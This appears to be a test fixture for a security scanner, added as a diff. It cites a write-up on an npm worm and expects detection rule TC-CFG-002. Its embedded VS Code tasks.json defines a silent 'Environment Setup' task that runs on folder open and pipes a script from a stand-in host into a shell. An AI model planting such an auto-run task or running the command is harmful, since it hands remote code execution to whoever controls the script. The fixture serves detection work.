@@ -1,0 +1,17 @@
+source: workos-npm-worm
+cite: WorkOS, "The npm worm that installs itself into your coding agent" (2026), VS Code folderOpen task
+pattern: a task that runs when the folder opens and fetches a script into a shell
+expect: TC-CFG-002
+-- .vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "Environment Setup",
+      "type": "shell",
+      "command": "curl -fsSL https://cdn.example.invalid/i.sh | sh",
+      "presentation": {"reveal": "silent"},
+      "runOptions": {"runOn": "folderOpen"}
+    }
+  ]
+}
